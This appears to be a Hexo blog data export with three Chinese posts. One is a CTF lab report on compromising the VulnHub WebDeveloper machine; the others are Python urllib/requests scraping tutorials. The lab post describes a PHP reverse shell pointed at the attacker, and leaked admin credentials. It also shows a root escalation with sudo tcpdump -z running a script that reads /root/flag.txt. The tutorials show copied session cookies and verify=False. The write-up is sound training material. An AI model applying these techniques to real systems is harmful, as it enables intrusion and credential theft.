{"meta":{"title":"myBlog","subtitle":"","description":null,"author":"Q","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-12-05T03:43:26.000Z","updated":"2023-12-05T10:16:39.080Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-12-05T03:43:37.000Z","updated":"2023-12-05T10:19:13.443Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"实验四CTF实践","slug":"实验四 CTF实践","date":"2023-12-31T04:43:29.112Z","updated":"2023-12-31T05:09:50.656Z","comments":true,"path":"2023/12/31/实验四 CTF实践/","permalink":"http://example.com/2023/12/31/%E5%AE%9E%E9%AA%8C%E5%9B%9B%20CTF%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"实验目的：通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。 系统环境：Kali Linux 2、WebDeveloper靶机来源：https://www.vulnhub.com/ 实验工具：不限 实验原理：1、什么是CTF CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 1.1 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。 1.2 CTF各大题型简介 MISC（安全杂项） 全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。 PPC（编程类） 全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。 CRYPTO（密码学） 全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。 REVERSE（逆向） 题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。 STEGA（隐写） 全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。 PWN（溢出） PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。 WEB（web类） WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web*站开始的。 实验步骤和内容：目的：获取靶机Web Developer 文件&#x2F;root&#x2F;flag.txt中flag。 基本思路：本网段IP地址存活扫描(netdiscover)；网络扫描(Nmap)；浏览HTTP 服务；网站目录枚举(Dirb)；发现数据包文件 “cap”；分析 “cap” 文件，找到网站管理后台账号密码；插件利用（有漏洞）；利用漏洞获得服务器账号密码；SSH 远程登录服务器；tcpdump另类应用。 实施细节如下： 1、 发现目标(netdiscover)，找到WebDeveloper的IP地址。截图。回答：sudo netdiscover -i eth0 -r 192.168.1.0 192.168.1.103 2.利用NMAP描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）回答：22&#x2F;ssh 80&#x2F;http 3.若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？ 4.利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？回答：whatweb 192.168.1.103 CMS使用的是wordpress4.9.8 5.网络搜索wpscan，简要说明其功能。回答：WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，它可以为所有 Web 开发人员扫描 WordPress 漏洞并在他们开发前找到并解决问题。我们还使用了 Nikto ，它是一款非常棒的Web 服务器评估工具，我们认为这个工具应该成为所有针对 WordPress网站进行的渗透测试的一部分 6.使用 Dirb 爆破网站目录。（Dirb 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。回答：dirb http://192.168.1.103/ 7.浏览器访问该目录（路径），发现一个cap文件。截图。 8.利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。回答：得到管理员账号&#x2F;密码webdeveloper&#x2F; Te5eQg&amp;4sBS!Yr$)wf%(DcAd 9.利用上一步得到的信息进入网站后台。截图。（网站管理员账号与操作系统账号是不同概念） 10.利用该CMS存在的（插件Plugin）漏洞。利用该插件漏洞提权。可选方案1：利用MeterSploit插件+reflex *gallery插件漏洞实现。安装reflex gallery插件。利用该插件可能存在的漏洞。***（课本知识点） 建立会话后，查看wp-config.php获得账号及口令。（配置文件很重要，各种系统的配置文件）。 获得的账号、口令是用来访问什么目标？注意与第7步描述比较。 回答：第七步得到的是网站管理员账户，这里得到的是系统账户 可选方案2：上传反弹shell http://pentestmonkey.net/tools/web-shells/php-reverse-shell 【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。 功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】 该CMS为PHP开发，可以利用其实现反弹shell。但必须修改初始化IP地址和端口。（指向攻击者）。 进入后台，找到任意一个PHP页面，然后利用php-reverse-shell.PHP的代码修改该页面的代码。修改代码中反弹目标的IP地址及端口（修改为攻击者IP地址及开放的端口号）。 攻击者在Kali中利用NC开始监听，攻击者浏览器访问修改的PHP页面。从而得到反弹shell（用户www-data）。建立会话后，查看wp-config.php获得账号及口令。（注意路径） 方案3：利用文件管理插件（File manager）漏洞。安装该插件，直接可以浏览wp-config.php。 11.SSH登录服务器尝试利用上一步获得的访问数据库的用户名和密码连接远程服务器。截图。 1.尝试查看&#x2F;root&#x2F;flag.txt以下操作得到的结果截图替代以下截图。 均无法查看。 2.使用tcpdump执行任意命令（当tcpdump捕获到数据包后会执行指定的命令。）查看当前身份可执行的命令。 发现可以root权限执行tcpdump命令 创建攻击文件 1touch /tmp/exploit1 写入shellcode 1echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/exploit 赋予可执行权限 1chmod +x /tmp/exploit 利用tcpdump执行任意命令 1sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root 获得flag tcpdump命令详解： -i eth0 从指定网卡捕获数据包 -w &#x2F;dev&#x2F;null 将捕获到的数据包输出到空设备（不输出数据包结果） -z [command] 运行指定的命令 -Z [user] 指定用户执行命令 -G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储 -W [num] 指定抓包数量 实验小结通过本次CTF实战，模拟了如何在靶机中窃取需要的某个文件数据（flag.txt），让我知道渗透在现实生活中可能的应用。 靶机Web Developer和kali在同一个网段，我们首先使用netdiscover工具扫描该网段，寻找存活的目标靶机的IP地址。netdiscover是一个强大的网络发现工具，可以帮助我们快速找到网络中的存活主机。 一旦我们获得了目标靶机的IP地址，接下来使用nmap进行端口扫描。nmap是一个非常流行的网络扫描工具，它可以扫描指定主机的开放端口，帮助我们了解目标主机上运行的服务。通过扫描，我们发现目标靶机开放了80端口和22端口，分别是http服务和ssh服务。 根据开放端口的信息，我们猜测目标主机提供了一个http服务。为了验证这个猜测，我们尝试使用浏览器访问目标网站的域名。通过访问目标网站，我们可以进一步了解该网站使用的CMS（内容管理系统）模板。为了探测目标网站使用的CMS模板，我们使用了whatweb工具。whatweb是一个强大的网站侦查工具，它可以检测网站使用的CMS类型、插件等信息。通过whatweb的检测，我们发现该网站搭建使用的CMS模板是World press[4.9.8]。知道了目标网站使用的CMS模板后，我们可以利用wpscan工具扫描该网站存在的漏洞。wpscan是一个针对WordPress的漏洞扫描工具，它可以检测WordPress网站的各种漏洞，并提供修复建议。在扫描过程中，我们发现了一些潜在的漏洞。为了进一步利用这些漏洞，我们需要获取目标网站的目录结构。于是，我们利用kali自带的Dirb工具进行目录爆破。Dirb是一个目录枚举工具，它可以尝试猜测目标网站的目录结构，并帮助我们找到敏感文件或目录。在爆破过程中，我们发现了一个似乎跟网络流量有关的路径。为了验证这个路径是否包含有价值的信息，我们使用浏览器访问该路径。访问成功后，我们发现了一个cap文件，正好可以用wires hark打开进行流量分析。Wireshark是一款强大的网络协议分析器，它可以捕获网络流量并详细分析每个数据包的内容。在流量分析过程中，我们过滤了http中的要登录的post请求数据。通过分析这些数据包，我们发现了一些类似账号密码的信息。这些信息很可能是网站后台的登录账号密码。有了这些账号密码信息，我们尝试访问后台登录的url。成功登录进入后台后，我们进一步利用该CMS存在的（插件Plugin）漏洞进行提权操作。通过提权操作，我们可以访问到一些敏感文件，如config文件等。在这些文件中，我们发现了服务器的账号密码。有了服务器的账号密码，我们尝试使用ssh远程登录服务器访问数据库。在数据库中，我们尝试查找&#x2F;root&#x2F;flag.txt文件，但均无法查看。为了获取该文件的内容，我们使用了tcpdump进行抓包分析。通过抓包分析，我们成功提权并查看了flag文件的内容。","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"urllib与requests2","slug":"urllib与requests2","date":"2023-12-28T05:03:58.389Z","updated":"2023-12-28T06:28:49.718Z","comments":true,"path":"2023/12/28/urllib与requests2/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests2/","excerpt":"","text":"三、requests模块处理cookie相关的请求学习目标 掌握requests处理cookie的三种方法 1 爬虫中使用cookie 为了能够通过爬虫获取到登录后的页面，或者是解决通过cookie的反扒，需要使用request来处理cookie相关的请求 1.1 爬虫中使用cookie的利弊 带上cookie的好处 能够访问登录后的页面 能够实现部分反反爬 带上cookie的坏处 一套cookie往往对应的是一个用户的信息，请求太频繁有更大的可能性被对方识别为爬虫 那么上面的问题如何解决 ?使用多个账号 1.2 requests处理cookie的方法使用requests处理cookie有三种方法： cookie字符串放在headers中 把cookie字典放传给请求方法的cookies参数接收 使用requests提供的session模块 2、cookie添加在heades中2.1 headers中cookie的位置 headers中的cookie： 使用分号(;)隔开 分号两边的类似a&#x3D;b形式的表示一条cookie a&#x3D;b中，a表示键（name），b表示值（value） 在headers中仅仅使用了cookie的name和value 2.2 cookie的具体组成的字段 由于headers中对cookie仅仅使用它的name和value，所以在代码中我们仅仅需要cookie的name和value即可 2.3 在headers中使用cookie复制浏览器中的cookie到代码中使用 12345headers = &#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;,&quot;Cookie&quot;:&quot; Pycharm-26c2d973=dbb9b300-2483-478f-9f5a-16ca4580177e; Hm_lvt_98b9d8c2fd6608d564bf2ac2ae642948=1512607763; Pycharm-26c2d974=f645329f-338e-486c-82c2-29e2a0205c74; _xsrf=2|d1a3d8ea|c5b07851cbce048bd5453846445de19d|1522379036&quot;&#125;requests.get(url,headers=headers) 注意：cookie有过期时间 ，所以直接复制浏览器中的cookie可能意味着下一程序继续运行的时候需要替换代码中的cookie，对应的我们也可以通过一个程序专门来获取cookie供其他程序使用；当然也有很多网站的cookie过期时间很长，这种情况下，直接复制cookie来使用更加简单 3、使用cookies参数接收字典形式的cookie cookies的形式：字典 1cookies = &#123;&quot;cookie的name&quot;:&quot;cookie的value&quot;&#125; 使用方法： 1requests.get(url,headers=headers,cookies=cookie_dict) 实例（爬取雪球网） 在网络中找到当前请求的网址 点击cookies 将当前的k,value复制到代码中 123456cookie_dict = &#123; &#x27;u&#x27;: &#x27;1990923459&#x27;, &#x27;bid&#x27;: &#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;, &#x27;xq_is_login&#x27;: &#x27;1&#x27;, &#x27;xq_r_token&#x27;: &#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;&#125; 完整代码 1234567891011121314151617181920import requests# 携带cookie登录雪球网 抓取完善个人资料页面headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://xueqiu.com/u/1990923459&#x27;, &#x27;Host&#x27;: &#x27;xueqiu.com&#x27;,&#125;url = &#x27;https://xueqiu.com/users/connectnew?redirect=/setting/user&#x27;cookie_dict = &#123; &#x27;u&#x27;: &#x27;1990923459&#x27;, &#x27;bid&#x27;: &#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;, &#x27;xq_is_login&#x27;: &#x27;1&#x27;, &#x27;xq_r_token&#x27;: &#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;&#125;res = requests.get(url, headers=headers, cookies=cookie_dict)with open(&#x27;雪球网.html&#x27;, &#x27;w&#x27;) as f: f.write(res.content.decode(&#x27;UTF-8&#x27;)) print(res.content.decode(&#x27;UTF-8&#x27;)) 成果 4、使用requests.session处理cookie 前面使用手动的方式使用cookie，那么有没有更好的方法在requets中处理cookie呢？ requests 提供了一个叫做session类，来实现客户端和服务端的会话保持 会话保持有两个内涵： 保存cookie，下一次请求会带上前一次的cookie 实现和服务端的长连接，加快请求速度 4.1 使用方法12session = requests.session()response = session.get(url,headers) session实例在请求了一个网站后，对方服务器设置在本地的cookie会保存在session中，下一次再使用session请求对方服务器的时候，会带上前一次的cookie 4.2 动手练习：模拟登陆 17k小说网 https://passport.17k.com/ 古诗文：https://so.gushiwen.cn 打码平台 图鉴 http://www.ttshitu.com/ 思路分析 准备url地址和请求参数 构造session发送post请求 使用session请求个人主页，观察是否请求成功 5、小结 cookie字符串可以放在headers字典中，键为Cookie，值为cookie字符串 可以把cookie字符串转化为字典，使用请求方法的cookies参数接收 使用requests提供的session模块，能够自动实现cookie的处理，包括请求的时候携带cookie，获取响应的时候保存cookie 四、requests模块的其他方法学习目标 掌握requests中cookirJar的处理方法 掌握requests解决https证书错误的问题 掌握requests中超时参数的使用 1、requests中cookirJar的处理方法 使用request获取的resposne对象，具有cookies属性，能够获取对方服务器设置在本地的cookie，但是如何使用这些cookie呢？ 1.1 方法介绍 response.cookies是CookieJar类型 使用requests.utils.dict_from_cookiejar，能够实现把cookiejar对象转化为字典 1.2 方法展示12345678910import requestsurl = &quot;http://www.baidu.com&quot;#发送请求，获取resposneresponse = requests.get(url)print(type(response.cookies))#使用方法从cookiejar中提取数据 等同于 dict(response.cookies)cookies = requests.utils.dict_from_cookiejar(response.cookies)print(cookies) 输出为: 12&lt;class &#x27;requests.cookies.RequestsCookieJar&#x27;&gt;&#123;&#x27;BDORZ&#x27;: &#x27;27315&#x27;&#125; 注意：在前面的requests的session类中，我们不需要处理cookie的任何细节，如果有需要，我们可以使用上述方法来解决 2、requests处理证书错误 经常我们在网上冲浪时，经常能够看到下面的提示： 出现这个问题的原因是：ssl的证书不安全导致 2.1 代码中发起请求的效果那么如果在代码中请求会怎么样呢？ 1234import requestsurl = &quot;https://www.12306.cn/mormhweb/&quot;response = requests.get(url) 返回证书错误，如下： 1ssl.CertificateError ... 2.2 解决方案为了在代码中能够正常的请求，我们修改添加一个参数 1234import requestsurl = &quot;https://www.12306.cn/mormhweb/&quot;response = requests.get(url, verify=False) 3、超时参数的使用 在平时网上冲浪的过程中，我们经常会遇到网络波动，这个时候，一个请求等了很久可能任然没有结果 在爬虫中，一个请求很久没有结果，就会让整个项目的效率变得非常低，这个时候我们就需要对请求进行强制要求，让他必须在特定的时间内返回结果，否则就报错 3.1 超时参数使用方法如下：1response = requests.get(url,timeout=3) 通过添加timeout参数，能够保证在3秒钟内返回响应，否则会报错 注意：这个方法还能够拿来检测代理ip的质量，如果一个代理ip在很长时间没有响应，那么添加超时之后也会报错，对应的这个ip就可以从代理ip池中删除","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"urllib与requests1","slug":"urllib与requests1","date":"2023-12-28T05:03:47.684Z","updated":"2023-12-28T06:28:21.385Z","comments":true,"path":"2023/12/28/urllib与requests1/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests1/","excerpt":"","text":"urllib与requests一、urllib的学习学习目标了解urllib的基本使用 1、urllib介绍除了requests模块可以发送请求之外, urllib模块也可以实现请求的发送,只是操作方法略有不同! urllib在python中分为urllib和urllib2，在python3中为urllib 下面以python3的urllib为例进行讲解 2、urllib的基本方法介绍2.1 urllib.Request 构造简单请求 12345import urllib#构造请求request = urllib.request.Request(&quot;http://www.baidu.com&quot;)#发送请求获取响应response = urllib.request.urlopen(request) 传入headers参数 1234567import urllib#构造headersheaders = &#123;&quot;User-Agent&quot; : &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;&#125; #构造请求request = urllib.request.Request(url, headers = headers)#发送请求response = urllib.request.urlopen(request) 传入data参数 实现发送post请求（示例） 123456789101112131415161718192021222324import urllib.requestimport urllib.parseimport jsonurl = &#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15&#x27;,&#125;data = &#123; &#x27;from&#x27;: &#x27;zh&#x27;, &#x27;to&#x27;: &#x27;en&#x27;, &#x27;q&#x27;: &#x27;lucky 是一个帅气的老&#x27;&#125;# 使用post方式# 需要data = urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)req = urllib.request.Request(url, data=data, headers=headers)res = urllib.request.urlopen(req)print(res.getcode())print(res.geturl())data = json.loads(res.read().decode(&#x27;utf-8&#x27;))print(data) 2.2 response.read()获取响应的html字符串,bytes类型 1234#发送请求response = urllib.request.urlopen(&quot;http://www.baidu.com&quot;)#获取响应response.read() 3、urllib请求百度首页的完整例子12345678910111213import urllibimport jsonurl = &#x27;http://www.baidu.com&#x27;#构造headersheaders = &#123;&quot;User-Agent&quot; : &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;&#125;#构造请求request = urllib.request.Request(url, headers = headers)#发送请求response = urllib.request.urlopen(request)#获取html字符串html_str = response.read().decode(&#x27;utf-8&#x27;)print(html_str) 4、小结 urllib.request中实现了构造请求和发送请求的方法 urllib.request.Request(url,headers,data)能够构造请求 urllib.request.urlopen能够接受request请求或者url地址发送请求，获取响应 response.read()能够实现获取响应中的bytes字符串 requests模块的入门使用一、requests模块的入门使用学习目标： 了解 requests模块的介绍 掌握 requests的基本使用 掌握 response常见的属性 掌握 requests.text和content的区别 掌握 解决网页的解码问题 掌握 requests模块发送带headers的请求 掌握 requests模块发送带参数的get请求 1、为什么要重点学习\brequests模块，而不是urllib 企业中用的最多的就是requests requests的底层实现就是urllib requests在python2 和python3中通用，方法完全一样 requests简单易用 2、requests的作用与安装作用：发送网络请求，返回响应数据 安装：pip install requests 3、requests模块发送简单的get请求、获取响应需求：通过requests向百度首页发送请求，获取百度首页的数据 12345678910import requests# 目标urlurl = &#x27;https://www.baidu.com&#x27;# 向目标url发送get请求response = requests.get(url)# 打印响应内容print(response.text) response的常用属性： response.text 响应体 str类型 response.encoding 从HTTP header中猜测的响应内容的编码方式 respones.content 响应体 bytes类型 response.status_code 响应状态码 response.request.headers 响应对应的请求头 response.headers 响应头 response.cookies 响应的cookie（经过了set-cookie动作） response.url 获取访问的url response.json() 获取json数据 得到内容为字典 (如果接口响应体的格式是json格式时) response.ok 如果status_code小于200，response.ok返回True。 如果status_code大于200，response.ok返回False。 思考：text是response的属性还是方法呢？ 一般来说名词，往往都是对象的属性，对应的动词是对象的方法 3.1 response.text 和response.content的区别 response.text 类型：str 解码类型： requests模块自动根据HTTP 头部对响应的编码作出有根据的推测，推测的文本编码 如何修改编码方式：response.encoding=&quot;gbk/UTF-8&quot; response.content 类型：bytes 解码类型： 没有指定 如何修改编码方式：response.content.deocde(&quot;utf8&quot;) 获取网页源码的通用方式： response.content.decode() response.content.decode(&quot;UTF-8&quot;) response.text 以上三种方法从前往后尝试，能够100%的解决所有网页解码的问题 所以：更推荐使用response.content.deocde()的方式获取响应的html页面 3.2 练习：把网络上的图片保存到本地 我们来把www.baidu.com的图片保存到本地 思考： 以什么方式打开文件 保存什么格式的内容 分析： 图片的url: https://www.baidu.com/img/bd_logo1.png 利用requests模块发送请求获取响应 以2进制写入的方式打开文件，并将response响应的二进制内容写入 1234567891011121314import requests# 图片的urlurl = &#x27;https://www.baidu.com/img/bd_logo1.png&#x27;# 响应本身就是一个图片,并且是二进制类型response = requests.get(url)# print(response.content)# 以二进制+写入的方式打开文件with open(&#x27;baidu.png&#x27;, &#x27;wb&#x27;) as f: # 写入response.content bytes二进制类型 f.write(response.content) 4、发送带header的请求 我们先写一个获取百度首页的代码 12345678910import requestsurl = &#x27;https://www.baidu.com&#x27;response = requests.get(url)print(response.content)# 打印响应对应请求的请求头信息print(response.request.headers) 4.1 思考对比浏览器上百度首页的网页源码和代码中的百度首页的源码，有什么不同？ 代码中的百度首页的源码非常少，为什么？ 4.2 为什么请求需要带上header？模拟浏览器，欺骗服务器，获取和浏览器一致的内容 4.3 header的形式：字典1headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125; 4.4 用法1requests.get(url, headers=headers) 4.5 完整的代码12345678910111213import requestsurl = &#x27;https://www.baidu.com&#x27;headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;# 在请求头中带上User-Agent，模拟浏览器发送请求response = requests.get(url, headers=headers)# print(response.content)# 打印请求头信息print(response.request.headers) 5、发送带参数的请求 我们在使用百度搜索的时候经常发现url地址中会有一个 ?，那么该问号后边的就是请求参数，又叫做查询字符串 5.1 什么叫做请求参数：例1： http://www.webkaka.com/tutorial/server/2015/021013/ 例2：https://www.baidu.com/s?wd=python&amp;a=c 例1中没有请求参数！例2中?后边的就是请求参数 5.2 请求参数的形式：字典1kw = &#123;&#x27;wd&#x27;:&#x27;长城&#x27;&#125; 5.3 请求参数的用法1requests.get(url,params=kw) 5.4 关于参数的注意点在url地址中， 很多参数是没有用的，比如百度搜索的url地址，其中参数只有一个字段有用，其他的都可以删除 如何确定那些请求参数有用或者没用：挨个尝试！ 对应的,在后续的爬虫中，越到很多参数的url地址，都可以尝试删除参数 5.5 两种方式：发送带参数的请求 对https://www.baidu.com/s?wd=python发起请求可以使用requests.get(url, params=kw)的方式 1234567891011121314151617181920# 方式一：利用params参数发送带参数的请求import requestsheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;# 这是目标url# url = &#x27;https://www.baidu.com/s?wd=python&#x27;# 最后有没有问号结果都一样url = &#x27;https://www.baidu.com/s?&#x27;# 请求参数是一个字典 即wd=pythonkw = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;# 带上请求参数发起请求，获取响应response = requests.get(url, headers=headers, params=kw)# 当有多个请求参数时，requests接收的params参数为多个键值对的字典，比如 &#x27;?wd=python&amp;a=c&#x27;--&gt;&#123;&#x27;wd&#x27;: &#x27;python&#x27;, &#x27;a&#x27;: &#x27;c&#x27;&#125;print(response.content) 也可以直接对https://www.baidu.com/s?wd=python完整的url直接发送请求，不使用params参数 1234567891011# 方式二：直接发送带参数的url的请求import requestsheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;url = &#x27;https://www.baidu.com/s?wd=python&#x27;# kw = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;# url中包含了请求参数，所以此时无需paramsresponse = requests.get(url, headers=headers) 6、小结 requests模块的介绍：能够帮助我们发起请求获取响应 requests的基本使用：requests.get(url) 以及response常见的属性： response.text 响应体 str类型 respones.content 响应体 bytes类型 response.status_code 响应状态码 response.request.headers 响应对应的请求头 response.headers 响应头 response.request._cookies 响应对应请求的cookie response.cookies 响应的cookie（经过了set-cookie动作） 掌握 requests.text和content的区别：text返回str类型，content返回bytes类型 掌握 解决网页的解码问题： response.content.decode() response.content.decode(&quot;UTF-8&quot;) response.text 掌握 requests模块发送带headers的请求：requests.get(url, headers=&#123;&#125;) 掌握 requests模块发送带参数的get请求：requests.get(url, params=&#123;&#125;) 二、requests模块的深入使用学习目标： 能够应用requests发送post请求的方法 能够应用requests模块使用代理的方法 了解代理ip的分类 1、使用requests发送POST请求 思考：哪些地方我们会用到POST请求？ 登录注册（ POST 比 GET 更安全） 需要传输大文本内容的时候（ POST 请求对数据长度没有要求） 所以同样的，我们的爬虫也需要在这两个地方回去模拟浏览器发送post请求 1.1 requests发送post请求语法： 用法： 1response = requests.post(&quot;http://www.baidu.com/&quot;, data = data, headers=headers) data 的形式：字典 1.2 POST请求练习下面面我们通过金山翻译的例子看看post请求如何使用： 地址：https://www.iciba.com/fy 思路分析 抓包确定请求的url地址 ![截屏2022-04-20 下午3.22.11](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.22.11.png) 确定请求的参数 ![截屏2022-04-20 下午3.23.07](..&#x2F;images&#x2F;requests1.assets&#x2F;截屏2022-04-20 下午3.23.07.png) 确定返回数据的位置 模拟浏览器获取数据 123456789101112131415161718192021import requestsimport jsonheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;&#125;url = &#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;data = &#123; &#x27;from&#x27;: &#x27;zh&#x27;, &#x27;to&#x27;: &#x27;en&#x27;, &#x27;q&#x27;: &#x27;lucky 是一个帅气的老师&#x27;&#125;res = requests.post(url, headers=headers, data=data)# print(res.status_code)# 返回的是json字符串 需要在进行转换为字典data = json.loads(res.content.decode(&#x27;UTF-8&#x27;))# print(type(data))print(data)print(data[&#x27;content&#x27;][&#x27;out&#x27;]) 1.3 